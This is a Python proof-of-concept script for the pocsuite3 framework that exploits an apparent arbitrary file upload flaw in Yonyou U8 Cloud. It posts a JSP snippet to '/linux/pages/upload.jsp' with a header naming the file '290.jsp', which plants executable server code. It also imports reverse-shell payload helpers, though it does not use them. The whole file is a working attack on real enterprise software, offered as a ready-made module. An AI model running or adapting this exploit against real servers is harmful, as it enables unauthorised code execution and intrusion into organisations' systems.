# _*_ coding:utf-8 _*_
# @Time : 2023/12/10
# @Author: 炼金术师诸葛亮
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class yongyouu8_cloud_upload(POCBase):
    pocDesc = '''用友u8cloud文件上传漏洞'''
    author = '炼金术师诸葛亮'
    createDate = '2023-12-10'
    name = '用友u8cloud文件上传漏洞'#需登录账号密码



    def _verify(self):

        result = {}
        url = self.url+ '/linux/pages/upload.jsp'

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Connection': 'close',
            "Upgrade-Insecure-Requests": "1",
            "Content-Type": "application/x-www-form-urlencoded",
            'filename': '290.jsp'
        }
        path = "/linux/pages/upload.jsp"
        try:
            data = '<% out.println("28921ojow~");%>'

            response = requests.post(url, headers=headers, data=data)
            if response.status_code == 200:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['path'] = path

            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(yongyouu8_cloud_upload)